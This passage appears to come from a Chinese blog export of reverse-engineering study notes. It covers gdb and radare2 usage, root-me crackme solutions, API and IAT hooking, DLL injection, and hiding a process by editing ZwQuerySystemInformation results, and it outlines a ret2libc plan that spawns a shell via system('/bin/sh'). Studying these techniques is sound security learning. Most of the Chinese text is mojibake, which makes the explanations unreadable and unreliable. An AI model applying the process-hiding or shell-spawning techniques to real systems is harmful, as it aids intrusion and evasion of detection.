//æ˜¾ç¤ºedxå€¼ni //ni/siéƒ½æ˜¯æ±‡ç¼–çº§åˆ«çš„æ–­ç‚¹å®šä½ã€‚siä¼šè¿›å…¥æ±‡ç¼–å’ŒCå‡½æ•°å†…éƒ¨,niä¸ä¼š//è¿™ä¸¤ä¸ªå‘½ä»¤ï¼ˆsi/niï¼‰æ‰€é’ˆå¯¹çš„æ˜¯æ±‡ç¼–æŒ‡ä»¤ï¼Œè€Œs/né’ˆå¯¹çš„æ˜¯æºä»£ç </code></pre><p><code>jz</code> è¡¨ç¤ºå½“<code>zf =1</code>æ—¶è·³è½¬ï¼Œå³ç»“æœä¸º0è·³è½¬ã€‚<br><code>jnz</code> å³ <code>zf=0</code>æ—¶è·³è½¬ï¼Œå³ç»“æœä¸ä¸º0 è·³è½¬ã€‚</p><pre><code>gdb-peda$ i r //å…¨æ˜¾ç¤ºgdb-peda$ set $eax=0gdb-peda$ x/s $eax //æŸ¥çœ‹å¯„å­˜å™¨æŒ‡å‘çš„å†…å®¹call WPA(&quot;toto&quot;, &quot;toto&quot;) //ç›´æ¥åœ¨gdbä¸­è¿è¡Œå‘½ä»¤ï¼Ÿï¼Ÿ</code></pre><h3 id="ELF-ptrace"><a href="#ELF-ptrace" class="headerlink" title="ELF ptrace"></a>ELF ptrace</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-x86-Ptrace</a></p><p><em>Load the application into <code>IDA pro</code>,search main function,press <code>F5</code>to disassemble it,get the code below:</em><br><code>IDA æŒ‰F5 åç¼–è¯‘ ç”Ÿæˆä¼ªä»£ç </code></p><hr><p><code>r2 -ww ./ch3.bin</code></p><pre><code>-w           open file in write modeww foobar            write wide string &apos;f\x00o\x00o\x00b\x00a\x00r\x00&apos;wx 9090     write two intel nops</code></pre><p><code>[0x080482f0]&gt; wx eb @ 0x0804841A</code><br>Short Jumpï¼ˆçŸ­è·³è½¬ï¼‰æœºå™¨ç  EB</p><p><code>pd N             disassemble N instructions</code></p><pre><code>gdb-peda$ i b set $al=$dl </code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘å·¥ç¨‹æ ¸å¿ƒåŸç†_little_summary</title>
      <link href="/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/"/>
      <url>/2020/10/06/%E9%80%86%E5%90%91%E5%B7%A5%E7%A8%8B%E6%A0%B8%E5%BF%83%E5%8E%9F%E7%90%86_little_summary/</url>
      
        <content type="html"><![CDATA[<h3 id="INT-å’Œ-IAT"><a href="#INT-å’Œ-IAT" class="headerlink" title="INT å’Œ IAT"></a>INT å’Œ IAT</h3><p>INT  æ˜¯rvaæ•°ç»„ï¼ŒINTè¡¨ç¤ºæ•°ç»„é¦–åœ°å€ æ•°ç»„å…ƒç´ æ˜¯ä¸€ä¸ªåœ°å€ æŒ‡å‘ç”±ä¸€ä¸ª2å­—èŠ‚ordinallåœ°å€å’Œå‡½æ•°åç§°ç»„æˆçš„ç»“æ„ä½“  ç¬¬ä¸€ä¸ªå€¼åœ°å€æŒ‡å‘ç¬¬ä¸€ä¸ªç»“æ„ä½“</p><p>å¦‚æœIATå­˜åœ¨äº é€‰æ‹©å¤´ä¸­IATè¡¨æ˜çš„åœ°å€ä¸­ ç›¸åº”æ²¡æœ‰å†™æƒé™ä¹Ÿæ²¡äº‹</p><p>INTå’ŒIATæŒ‡å‘å†…å®¹æœ‰æ—¶ç›¸åŒ è¡¨ç¤ºåœ°å€è‚¯å®šä¸åŒ å› ä¸ºä¿å­˜åœ¨ä¸åŒåœ°å€ æ‰€æŒ‡å†…å®¹ç›¸åŒ</p><a id="more"></a><hr><h3 id="è¿›ç¨‹å†…å­˜è½¬å‚¨"><a href="#è¿›ç¨‹å†…å­˜è½¬å‚¨" class="headerlink" title="è¿›ç¨‹å†…å­˜è½¬å‚¨"></a>è¿›ç¨‹å†…å­˜è½¬å‚¨</h3><p>OLLYGDBæ’ä»¶ï¼Ÿï¼Ÿ dumpå‘½ä»¤<br>æ˜¯è§£å‹ç¼©è¿è¡Œæ—¶ï¼Œå°†å†…å­˜è½¬ä¸ºæ–‡ä»¶ï¼Œæ–¹ä¾¿æŸ¥çœ‹</p><hr><h3 id="ä»£ç æ³¨å…¥"><a href="#ä»£ç æ³¨å…¥" class="headerlink" title="ä»£ç æ³¨å…¥"></a>ä»£ç æ³¨å…¥</h3><p>ä½¿ç”¨CALLæŒ‡ä»¤å°†æ¥ä¸‹æ¥çš„åœ¨ä»£ç é—´çš„å­—ç¬¦ä¸²æ•°æ®åœ°å€å‹å…¥æ ˆï¼Œç„¶åç›´æ¥æ¥ä¸‹æ¥è¿è¡Œå‘½ä»¤</p><p>CALL EAX<br>EAXä¿å­˜å‡½æ•°åœ°å€<br>32ä½ä¿å­˜è¿”å›å†…å®¹</p><hr><h3 id="top-å‘½ä»¤-linux"><a href="#top-å‘½ä»¤-linux" class="headerlink" title="top å‘½ä»¤ (linux)"></a>top å‘½ä»¤ (linux)</h3><p>æŸ¥çœ‹ CPU æ—¶é—´åœ¨ User space ä¸ Kernel Space ä¹‹é—´çš„åˆ†é…æƒ…å†µ</p><hr><h3 id="SEHé“¾"><a href="#SEHé“¾" class="headerlink" title="SEHé“¾"></a>SEHé“¾</h3><p>ollydbg VIEW-SEH CHAIN</p><hr><h3 id="APIé’©å–"><a href="#APIé’©å–" class="headerlink" title="APIé’©å–"></a>APIé’©å–</h3><p>windows ä¸­å†…æ ¸æ¨¡å¼æ‰€æœ‰ä»£ç å…±ç”¨ä¸€ä¸ªè™šæ‹Ÿç©ºé—´åœ°å€ï¼Œç”¨APIä¼ <br>e1 = 9Fh =&gt; 0fh*2^7 = 780h</p><p>ä½¿ç”¨å¸¸è§„ç³»ç»Ÿèµ„æºçš„APIä¼šç»ç”±kernel32.dllå’Œntdll.dllä¸æ–­å‘ä¸‹è°ƒç”¨ï¼Œæœ€åç»ç”±SYSENTERå‘½ä»¤è¿›å…¥å†…æ ¸æ¨¡å¼</p><p><img src="https://s1.ax1x.com/2020/10/06/0N35f1.png" alt="0N35f1.png"></p><hr><p><img src="https://s1.ax1x.com/2020/10/06/0N3vtA.png" alt="0N3vtA.png"></p><hr><h3 id="åŠ¨æ€æ–¹æ³•å¸¸ç”¨-è°ƒè¯•å’Œæ³¨å…¥"><a href="#åŠ¨æ€æ–¹æ³•å¸¸ç”¨-è°ƒè¯•å’Œæ³¨å…¥" class="headerlink" title="åŠ¨æ€æ–¹æ³•å¸¸ç”¨ è°ƒè¯•å’Œæ³¨å…¥"></a>åŠ¨æ€æ–¹æ³•å¸¸ç”¨ è°ƒè¯•å’Œæ³¨å…¥</h3><h4 id="æ–¹æ³•1ï¼šè°ƒè¯•"><a href="#æ–¹æ³•1ï¼šè°ƒè¯•" class="headerlink" title="æ–¹æ³•1ï¼šè°ƒè¯•"></a>æ–¹æ³•1ï¼šè°ƒè¯•</h4><p>å¼‚å¸¸å¿…é¡»å¤„ç†ä¸ºEXCEPTION_BREAKPOINT æ±‡ç¼–æŒ‡ä»¤ä¸ºint 3 IA-32æŒ‡ä»¤ä¸º0xCC </p><p>ç”¨å¼‚å¸¸è·å–APIçš„æ§åˆ¶</p><p>çº¿ç¨‹ä¸Šä¸‹æ–‡ï¼Œï¼ˆæ‰§è¡Œå®Œä¸€ä¸ªçº¿ç¨‹æ—¶é—´ç‰‡ï¼Œæ‰§è¡Œå¦ä¸€ä¸ªï¼‰ï¼Œä¹Ÿå°±æ˜¯å„ä¸ªå¯„å­˜å™¨ä¿¡æ¯ï¼Œä¿å­˜åœ¨CONTEXTç»“æ„ä½“ä¸­ã€‚</p><p>CONTEXT.esp</p><p>apié’©å– è·å–æŸä¸ªAPIçš„æ§åˆ¶æƒ</p><h4 id="æ–¹æ³•2ï¼šDLLæ³¨å…¥"><a href="#æ–¹æ³•2ï¼šDLLæ³¨å…¥" class="headerlink" title="æ–¹æ³•2ï¼šDLLæ³¨å…¥"></a>æ–¹æ³•2ï¼šDLLæ³¨å…¥</h4><p>setwindowstextA è¡¨ç¤ºASCII<br>setwindowstextW è¡¨ç¤ºå®½å­—ç¬¦ winä¸­ä¸ºUnicodeç </p><h3 id="IATé’©å–"><a href="#IATé’©å–" class="headerlink" title="IATé’©å–"></a>IATé’©å–</h3><p>é€šè¿‡æ³¨å…¥DLLï¼Œä¿®æ”¹IATä¸­æŒ‡å‘æŸAPIçš„åœ°å€æ”¹ä¸ºæŒ‡å‘è‡ªå·±APIçš„åœ°å€ï¼Œè‡ªå·±çš„å‡½æ•°å†å»è°ƒç”¨æŸAPIï¼Œæ¥è¾¾åˆ°ä¿®æ”¹çš„ç›®çš„</p><hr><h3 id="æœç´¢API"><a href="#æœç´¢API" class="headerlink" title="æœç´¢API"></a>æœç´¢API</h3><p><strong>åœ¨ç”¨ollydngè¿›è¡Œå†…éƒ¨æ¨¡å—call æœç´¢æ—¶ï¼Œå…ˆé€‰å–å¯¹çš„æ¨¡å—ã€‚å³é”®-select moudle</strong><br>åœ¨ç”¨ollydbg ä¸­<code>search for name</code>å‘½ä»¤</p><hr><h3 id="APIä»£ç ä¿®æ”¹"><a href="#APIä»£ç ä¿®æ”¹" class="headerlink" title="APIä»£ç ä¿®æ”¹"></a>APIä»£ç ä¿®æ”¹</h3><p>å°†APIå¤´äº”ä¸ªå­—èŠ‚ ä¿®æ”¹ ä¸ºJMP XXXXXXXX<br>å³è·³è½¬åˆ°æ³¨å…¥çš„å‡½æ•°ä¸­</p><p>é€šè¿‡å°†ntdll.ZwQuerySystemInformation() å‡½æ•°å½¢æˆçš„é“¾è¡¨ä¸­åˆ é™¤è¿›ç¨‹ä¿¡æ¯å³å¯åšåˆ°éšè—ç›¸å…³è¿›ç¨‹ã€‚</p><h3 id="å…¨å±€APIé’©å–"><a href="#å…¨å±€APIé’©å–" class="headerlink" title="å…¨å±€APIé’©å–"></a>å…¨å±€APIé’©å–</h3><p>é€šè¿‡ä¿®æ”¹ntdll.ZwResumeThread() API</p><h3 id="çƒ­è¡¥ä¸-hot-patch"><a href="#çƒ­è¡¥ä¸-hot-patch" class="headerlink" title="çƒ­è¡¥ä¸ hot patch"></a>çƒ­è¡¥ä¸ hot patch</h3><p>ä¿®æ”¹7å­—èŠ‚ä»£ç <br>1.äºŒæ¬¡è·³è½¬<br>ä¸¤å­—èŠ‚è·³åˆ°æŒ‡ä»¤ä¸Šé¢ï¼Œç”¨äº”å­—èŠ‚è·³åˆ°è‡ªå·±çš„å‡½æ•°åœ°å€<br>2.ä¸ç”¨è„±é’©ï¼Œåœ°å€+2å­—èŠ‚ï¼Œå°±å¯æ­£å¸¸è¿è¡Œ</p><p>ia-32 E9 è¡¨ç¤ºfar jmp äº”å­—èŠ‚ã€‚<br><code>E9 XXXXXXXX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰</code></p><p>EB è¡¨ç¤º short jmp ä¸¤å­—èŠ‚<br>ä¾æ‰˜å½“å‰EIP åœ¨-128~127èŒƒå›´é—´è·³è½¬<br><code>XX=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ2ï¼‰</code></p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ch25.bin</title>
      <link href="/2020/10/05/ch25bin/"/>
      <url>/2020/10/05/ch25bin/</url>
      
        <content type="html"><![CDATA[<h2 id="é€†å‘-root-me"><a href="#é€†å‘-root-me" class="headerlink" title="é€†å‘ root_me"></a>é€†å‘ root_me</h2><h3 id="ch25-bin"><a href="#ch25-bin" class="headerlink" title="ch25.bin"></a>ch25.bin</h3><p><a href="https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en" target="_blank" rel="noopener">https://www.root-me.org/en/Challenges/Cracking/ELF-C-0-protection?lang=en</a><br><a id="more"></a></p><h4 id="è¯†åˆ«C-ç±»"><a href="#è¯†åˆ«C-ç±»" class="headerlink" title="è¯†åˆ«C++ç±»"></a>è¯†åˆ«C++ç±»</h4><p>å¦‚ä½•è¯†åˆ«è½¯ä»¶æ˜¯ç”¨C++æ‰€å†™ï¼Ÿ<br>1 é¢‘ç¹ä½¿ç”¨ECX ä¿å­˜this æŒ‡é’ˆ ï¼ŒæŒ‡å‘ç±»å¯¹è±¡ï¼Œå¦‚åœ¨è°ƒç”¨å‡½æ•°å‰<br>2 è™šå‡½æ•° è¦å…ˆçŸ¥é“ç±»è™šå‡½æ•°è¡¨ï¼Œç„¶åå¾—åˆ°å®é™…å€¼ï¼Œä¹Ÿæ˜¯ä¼ åˆ°ECXä¸­<br>3 ä½¿ç”¨STL code å¯ç”¨IDA importsæŸ¥çœ‹</p><h4 id="ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨"><a href="#ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨" class="headerlink" title="ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨"></a>ç±»æ€ä¹ˆåœ¨å†…å­˜ä¸­å­˜å‚¨</h4><p>æ¯ä¸ªå˜é‡å››å­—èŠ‚<br>ä¸è¶³è¦å¯¹é½<br>å†…å­˜ä¸­æ’åˆ—ä¸å®šä¹‰ç›¸åŒ</p><hr><p>è™šå‡½æ•°è¡¨è¦åœ¨æœ€å¼€å¤´<br>è¡¨åŒ…å«è™šå‡½æ•°åœ°å€ï¼ŒæŒ‰å®šä¹‰æ’åº</p><p><strong>å¦‚æœç»§æ‰¿å¦ä¸€ä¸ªç±»</strong></p><p>ç»§æ‰¿å¤šä¸ªç±»<br><strong>è™šè¡¨æŒ‰é¡ºåºæ’åº</strong></p><hr><h4 id="è¯†åˆ«ç±»"><a href="#è¯†åˆ«ç±»" class="headerlink" title="è¯†åˆ«ç±»"></a>è¯†åˆ«ç±»</h4><h5 id="1-è¯†åˆ«æ„å»ºå’Œæ’¤é”€"><a href="#1-è¯†åˆ«æ„å»ºå’Œæ’¤é”€" class="headerlink" title="1 è¯†åˆ«æ„å»ºå’Œæ’¤é”€"></a>1 è¯†åˆ«æ„å»ºå’Œæ’¤é”€</h5><h6 id="1-1-å…¨å±€å˜é‡"><a href="#1-1-å…¨å±€å˜é‡" class="headerlink" title="1.1 å…¨å±€å˜é‡"></a>1.1 å…¨å±€å˜é‡</h6><p>åœ¨ç¼–è¯‘æ—¶ ä¿å­˜åˆ°ï¼ˆPEï¼‰æ–‡ä»¶çš„æ•°æ®æ®µ<br>æ„å»ºåœ¨main()å‰è°ƒç”¨</p><h6 id="ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain-é—´ï¼Œç¡®å®šä¸ºæ„å»º"><a href="#ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain-é—´ï¼Œç¡®å®šä¸ºæ„å»º" class="headerlink" title="ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain()é—´ï¼Œç¡®å®šä¸ºæ„å»º"></a>ç”¨thisè°ƒç”¨å…¨å±€å˜é‡ï¼Œåœ¨EPå’Œmain()é—´ï¼Œç¡®å®šä¸ºæ„å»º</h6><p>1.2å±€éƒ¨å˜é‡<br>æŒ‡é’ˆæŒ‡å‘æœªåˆå§‹åŒ–çš„æ ˆå˜é‡</p><h6 id="1-3åŠ¨æ€åˆ†é…å˜é‡-new-ï¼‰"><a href="#1-3åŠ¨æ€åˆ†é…å˜é‡-new-ï¼‰" class="headerlink" title="1.3åŠ¨æ€åˆ†é…å˜é‡ new(ï¼‰"></a>1.3åŠ¨æ€åˆ†é…å˜é‡ new(ï¼‰</h6><p>å †ä¸Šåˆ†é…</p><h5 id="2å¤šæ€ç±»è¯†åˆ«"><a href="#2å¤šæ€ç±»è¯†åˆ«" class="headerlink" title="2å¤šæ€ç±»è¯†åˆ«"></a>2å¤šæ€ç±»è¯†åˆ«</h5><h6 id="2-1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚"><a href="#2-1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚" class="headerlink" title="2.1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚"></a>2.1é‰´åˆ«å¤šæ€é€šè¿‡RTTIï¼Œå…¶å¯ä»¥è®©å¯¹è±¡åœ¨è¿è¡Œæ—¶ç¡®å®šç±»å‹ã€‚</h6><p>RTTICompleteObjectLocator pointer</p><hr><p>TypeDescriptor<br>æŒ‡å‘çš„ç»“æ„åŒ…å«ç±»å</p><hr><p>RTTIClassHierarchyDescriptor</p><hr><p>RTTIBaseClassDescriptor</p><hr><p>vftable<br>vbtable (virtual base class table)</p><hr><h3 id="æŒ‡ä»¤E9"><a href="#æŒ‡ä»¤E9" class="headerlink" title="æŒ‡ä»¤E9"></a>æŒ‡ä»¤<code>E9</code></h3><p>æŒ‡ä»¤<code>E9</code>ç›¸å¯¹å¯»å€<br>e9 xxxxxxxx<br><code>xxxxxxxx=è¦è·³è½¬çš„åœ°å€-å½“å‰æŒ‡ä»¤åœ°å€-å½“å‰æŒ‡ä»¤é•¿åº¦ï¼ˆ5ï¼‰</code><br>e9 00 00 00 00  å³è·³è½¬åˆ°ä¸‹ä¸€ä¸ªåœ°å€<br>402005-402000-5=000000</p><h3 id="æŒ‡ä»¤EB"><a href="#æŒ‡ä»¤EB" class="headerlink" title="æŒ‡ä»¤EB"></a>æŒ‡ä»¤<code>EB</code></h3><p><code>EB</code>è¡¨ç¤ºshort jmpå‘½ä»¤ï¼Œè¿›è¡ŒçŸ­è·ç¦»è·³è½¬<br>eb xx</p><hr><h3 id="æŒ‡ä»¤setne"><a href="#æŒ‡ä»¤setne" class="headerlink" title="æŒ‡ä»¤setne"></a>æŒ‡ä»¤setne</h3><p><strong>set  if  not  equal</strong><br>setne cl<br>if ZF=1 then cl=0<br>if ZF=0 then cl=1</p><p>strings å‘½ä»¤<br>display printable strings in [file(s)] (stdin by default)</p><hr><h3 id="ç ´è§£æ–¹æ³•1"><a href="#ç ´è§£æ–¹æ³•1" class="headerlink" title="ç ´è§£æ–¹æ³•1"></a>ç ´è§£æ–¹æ³•1</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$ gdb ./ch25.bin </span><br><span class="line">(gdb) <span class="built_in">set</span> args toto <span class="comment">//è®¾ç½®è¾“å…¥å‚æ•°toto</span></span><br><span class="line">(gdb) b main <span class="comment">//åœ¨mainè®¾ç½®æ–­ç‚¹</span></span><br><span class="line">Breakpoint <span class="number">1</span> at <span class="number">0x8048a95</span> </span><br><span class="line">(gdb) r  <span class="comment">//è¿è¡Œç¨‹åºï¼ˆåˆ°æ–­ç‚¹ï¼‰</span></span><br><span class="line">Breakpoint <span class="number">1</span>, <span class="number">0x08048a95</span> <span class="function">in <span class="title">main</span> <span class="params">()</span></span></span><br><span class="line"><span class="function"><span class="params">(gdb)</span>disass <span class="comment">//æ˜¾ç¤ºæ±‡ç¼–ä»£ç </span></span></span><br><span class="line">(gdb) b *main+268</span><br><span class="line">gdb)c ç»§ç»­æ‰§è¡Œ</span><br><span class="line">(gdb) layout prev å¯ä»¥æŸ¥çœ‹å †æ ˆå’Œæ±‡ç¼–ä»£ç </span><br><span class="line">(gdb) x/<span class="number">1</span>xw $eax</span><br><span class="line">â€œ x / <span class="number">1</span>xw $ eaxå‘½ä»¤åœ¨EAXå¯„å­˜å™¨ä¸­åŒ…å«çš„åœ°å€å¤„æ˜¾ç¤º<span class="number">1</span>ä¸ªåå…­è¿›åˆ¶æ ¼å¼çš„<span class="number">16</span>ä½å­—</span><br><span class="line">(gdb) x/<span class="number">1</span>s <span class="number">0X08050b24</span></span><br><span class="line">æŸ¥çœ‹è¯¥åœ°å€å€¼</span><br></pre></td></tr></table></figure><h3 id="ç ´è§£æ–¹æ³•2"><a href="#ç ´è§£æ–¹æ³•2" class="headerlink" title="ç ´è§£æ–¹æ³•2"></a>ç ´è§£æ–¹æ³•2</h3><p><code>radare2</code> ç±»ä¼¼IDA<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">r2 ch25.bin</span><br><span class="line">aaa <span class="comment">//åˆ†æå‡½æ•°ï¼Œå‚æ•°...</span></span><br><span class="line">VV @main <span class="comment">//ä½¿ç”¨ VV è¿›å…¥ å›¾å½¢åŒ–æ¨¡å¼ï¼ˆéœ€è¦æ˜¯å‡½æ•°èŒƒå›´å†…ï¼‰ã€‚</span></span><br><span class="line">pdf @ main <span class="comment">//åˆ†æåå°±å¯ä»¥æ­£å¸¸æ‰“å°å‡½æ•°ä»£ç äº†ï¼ˆpdf æ‰“å°å‡½æ•°ä»£ç ï¼‰</span></span><br></pre></td></tr></table></figure></p><p>pedaæ˜¯GDBçš„ä¸€ä¸ªæ’ä»¶<br><a href="https://github.com/longld/peda" target="_blank" rel="noopener">https://github.com/longld/peda</a></p><p>gdb-peda$ run jlkd å¸¦å‚æ•°è¿è¡Œ</p>]]></content>
      
      
      
        <tags>
            
            <tag> RCE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>é€†å‘ å­¦ä¹ r2 part2</title>
      <link href="/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/"/>
      <url>/2020/09/27/%E9%80%86%E5%90%91%E5%AD%A6%E4%B9%A0r2part2/</url>
      
        <content type="html"><![CDATA[<h2 id="é€†å‘-å­¦ä¹ r2-part2"><a href="#é€†å‘-å­¦ä¹ r2-part2" class="headerlink" title="é€†å‘ å­¦ä¹ r2 part2"></a>é€†å‘ å­¦ä¹ r2 part2</h2><p><a href="https://www.megabeets.net/a-journey-into-radare-2-part-2/" target="_blank" rel="noopener">https://www.megabeets.net/a-journey-into-radare-2-part-2/</a></p><p>åœ¨NXå’ŒASLRçš„ä¿æŠ¤ä¸‹</p><hr><a id="more"></a><p><code>$ r2 -d megabeets_0x2</code><br><code>-d</code> â€“ Open in the debug mode<br>aas â€“ Analyze functions, symbols and more</p><p><code>dcu address      Continue until address</code></p><p><code>VV</code></p><p><code>pdf @ sym.beet</code></p><hr><h3 id="ragg2"><a href="#ragg2" class="headerlink" title="ragg2"></a>ragg2</h3><p><code>ragg2</code>, which allows us to generate a cyclic pattern called De Bruijn Sequence and check the exact offset where our payload overrides the buffer.<br>å®ƒå…è®¸æˆ‘ä»¬ç”Ÿæˆä¸€ä¸ªç§°ä¸ºDe Bruijn Sequenceçš„å¾ªç¯æ¨¡å¼ï¼Œå¹¶æ£€æŸ¥æœ‰æ•ˆè½½è·è¦†ç›–ç¼“å†²åŒºçš„ç¡®åˆ‡åç§»é‡</p><pre><code>-P [size]       prepend debruijn pattern -q [fragment]   debruijn pattern offset -r              show raw bytes instead of hexpairs</code></pre><p><code>$ ragg2 -P 100 -r</code><br><em>ä¹‹å‰SEHæ”»å‡» åº”è¯¥æœ‰ç”¨è¿‡</em></p><hr><h3 id="rarun2"><a href="#rarun2" class="headerlink" title="rarun2"></a>rarun2</h3><p><code>rarun2</code>ç”¨ä½œå¯åŠ¨å™¨ï¼Œç”¨äºè¿è¡Œå…·æœ‰ä¸åŒç¯å¢ƒï¼Œå‚æ•°ï¼Œæƒé™ï¼Œç›®å½•çš„ç¨‹åºï¼Œå¹¶è¦†ç›–é»˜è®¤æ–‡ä»¶æè¿°ç¬¦ï¼ˆä¾‹å¦‚stdinï¼‰ã€‚<br>å½“æ‚¨å¿…é¡»ä½¿ç”¨é•¿å‚æ•°è¿è¡Œç¨‹åºï¼Œå°†å¤§é‡æ•°æ®ä¼ é€’ç»™stdinæˆ–ç±»ä¼¼çš„ä¸œè¥¿æ—¶ï¼Œè¿™å¾ˆæœ‰ç”¨ï¼Œè¿™é€šå¸¸æ˜¯åˆ©ç”¨äºŒè¿›åˆ¶æ–‡ä»¶çš„æƒ…å†µã€‚</p><hr><pre><code>$ ragg2 -P 200 -r &gt; pattern.txt$ cat pattern.txt</code></pre><hr><pre><code>$ vim profile.rr2$ cat profile.rr2#!/usr/bin/rarun2stdin=./pattern.txt</code></pre><hr><p><code>$ r2 -r profile.rr2 -d megabeets_0x2</code><br>-r [rarun2]  specify rarun2 profile to load (same as -e dbg.profile=X)<br>-d           debug the executable â€˜fileâ€™ or running process â€˜pidâ€™</p><hr><p>ä¿¡å·æ˜¯å‘é€åˆ°åŒä¸€è¿›ç¨‹ä¸­çš„æŸä¸ªè¿›ç¨‹æˆ–ç‰¹å®šçº¿ç¨‹çš„å¼‚æ­¥é€šçŸ¥ï¼Œä»¥ä¾¿å°†å‘ç”Ÿçš„äº‹ä»¶é€šçŸ¥ç»™å®ƒã€‚<br>Â·å½“SIGSEGVï¼ˆ11ï¼‰ä¿¡å·åšå‡ºæ— æ•ˆçš„è™šæ‹Ÿå†…å­˜å¼•ç”¨æˆ–åˆ†æ®µé”™è¯¯æ—¶ï¼Œå³åœ¨æ‰§è¡Œåˆ†æ®µè¿è§„æ—¶ï¼Œå°†å…¶å‘é€åˆ°è¿›ç¨‹ã€‚</p><hr><p><code>wopO value</code>       Finds the given value into a De Bruijn Pattern at current offset</p><p>| dr                     Show â€˜gprâ€™ registers<br>wopO <code>dr eip</code><br>æ²¡æœ‰æˆåŠŸ<br>wopO 0x41417641</p><hr><p>i   Get info from opened file (see rabin2â€™s manpage)<br>ii                 Imports<br>iip æ›´ç®€æ˜</p><hr><p>The plan</p><ol><li>Leak the real address of puts</li><li>Calculate the base address of libc</li><li>Calculate the address of system</li><li>Find an address in libc that contains the string /bin/sh</li><li>Call system with /bin/sh and spawn a shell</li></ol><hr><p><code>è¿‡ç¨‹é“¾æ¥è¡¨Procedure Linkage Tableï¼ˆPLT)</code>æ˜¯ä¸€ä¸ªå†…å­˜ç»“æ„ï¼Œå…¶ä¸­åŒ…å«å¤–éƒ¨åŠŸèƒ½çš„ä»£ç å­˜æ ¹ï¼Œè¿™äº›å‡½æ•°çš„åœ°å€åœ¨é“¾æ¥æ—¶æ˜¯æœªçŸ¥çš„ã€‚<br>Â·æ¯å½“æˆ‘ä»¬åœ¨.textæ®µä¸­çœ‹åˆ°å¯¹å‡½æ•°çš„CALLæŒ‡ä»¤æ—¶ï¼Œéƒ½ä¸ä¼šç›´æ¥è°ƒç”¨è¯¥å‡½æ•°ã€‚<br>Â·ç›¸åï¼Œå®ƒåœ¨PLTå¤„è°ƒç”¨å­˜æ ¹ä»£ç ï¼Œä¾‹å¦‚<code>func_name @ plt</code>ã€‚<br>ç„¶åï¼Œå­˜æ ¹è·³è½¬åˆ°<code>å…¨å±€åç§»è¡¨ï¼ˆGOTï¼‰</code>ä¸­ä¸ºæ­¤åŠŸèƒ½åˆ—å‡ºçš„åœ°å€ã€‚<br>å¦‚æœå®ƒæ˜¯æ­¤åŠŸèƒ½çš„ç¬¬ä¸€ä¸ªCALLï¼Œåˆ™<code>GOTæ¡ç›®å°†æŒ‡å‘PLTï¼Œåè€…å°†è°ƒç”¨åŠ¨æ€é“¾æ¥å™¨ï¼Œè¯¥é“¾æ¥å™¨å°†è§£ææ‰€éœ€åŠŸèƒ½çš„å®é™…åœ°å€</code><br>ä¸‹æ¬¡è°ƒç”¨func_name @ pltæ—¶ï¼Œå­˜æ ¹ç›´æ¥ä»<code>GOTè·å–åŠŸèƒ½åœ°å€</code>ã€‚<br>((å°‘äº†åŠ¨æ€é“¾æ¥æ­¥éª¤ï¼Ÿï¼Ÿ))</p><hr><p><code>pwntools</code>æ¼æ´åˆ©ç”¨æ¡†æ¶</p><hr><pre><code>~ character is radareâ€™s internal grep[0xf7763b30]&gt; # the address of puts@plt:[0xf7763b30]&gt; ?v sym.imp.puts //Usage: ?v[id][ num]  # Show value0x08048390[0xf7763b30]&gt; ?v reloc.puts</code></pre><p><code>syæŒ‰tabé”®è‡ªåŠ¨æœå¯»</code></p><hr><pre><code>Usage: dmi    # List/Load SymbolsAll these paddr=0x000xxxxx are the offsets of the function from libc base. </code></pre><hr><p>ä¸ºæ­¤ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨radareçš„æœç´¢åŠŸèƒ½ã€‚<br>Â·é»˜è®¤æƒ…å†µä¸‹ï¼Œradareæ­£åœ¨dbg.mapä¸­æœç´¢ï¼Œè¿™æ˜¯å½“å‰çš„å†…å­˜æ˜ å°„ã€‚<br>Â·æˆ‘ä»¬è¦æœç´¢æ‰€æœ‰å†…å­˜æ˜ å°„ï¼Œå› 